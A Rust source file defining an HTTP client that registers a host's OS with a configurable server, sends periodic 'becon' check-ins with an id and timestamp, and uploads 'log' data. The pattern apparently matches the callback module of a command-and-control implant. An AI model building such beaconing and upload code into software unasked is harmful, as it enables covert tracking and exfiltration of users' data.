use serde_json::json;


pub struct Connection<'a>{
    url: &'a str,
    reg: &'a str,
    becon: &'a str,
    upload: &'a str,
    server: reqwest::Client
}


impl<'a> Connection<'a>{
    pub fn new(url : &'a str) -> Connection<'a>{

        Connection{
            url:url,
            reg: "/register",
            becon: "/becon",
            upload: "/upload",
            server: reqwest::Client::new()
        }
    }


    //the only one that should use a sync
    pub async fn register(&self, os:& str) -> Result<String, reqwest::Error> {
        let url = format!("{}{}",self.url,self.reg);

        let params = [("OS", os)];

        let response = self.server.post(url)
        .form(&params)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    pub async fn becon(&self, id:& str) -> Result<String, reqwest::Error> {
        let url = format!("{}{}",self.url,self.becon);
        let params = [("id", id), ("timestamp", &chrono::Utc::now().to_string())];

        let response = self.server.get(url)
        .form(&params)
        .send()
        .await?;

        Ok(response.text().await?)
    }

    pub async fn send_data(&self, id:& str, data: &'static str) -> Result<String, reqwest::Error> {

        let url = format!("{}{}",self.url,self.upload);

        let data_json = json!({
            "id" : &id,
            "log": &data
        });

        let response = self.server.post(url)
        .json(&data_json)
        .send()
        .await?;

        Ok(response.text().await?)
    }
    // pub fn post_request(&self) -> Result<RecData, ureq::Error>{

    //     let send_body = SendData {sent: "yo".to_string()};

    //     let body:RecData = ureq::post(self.url)
    //         .header("example-Header", "Header Value")
    //         .send_json(&send_body)?
    //         .body_mut()
    //         .read_json::<RecData>()?;

    //     Ok(body)

    // }

    // pub fn get_request(&self) -> Result<String, ureq::Error> {

    //     let body: String = ureq::get(self.url)
    //     .header("Example-Header", "header value")
    //     .call()?
    //     .body_mut()
    //     .read_to_string()?;
    //     Ok(body)
    // }
    
}
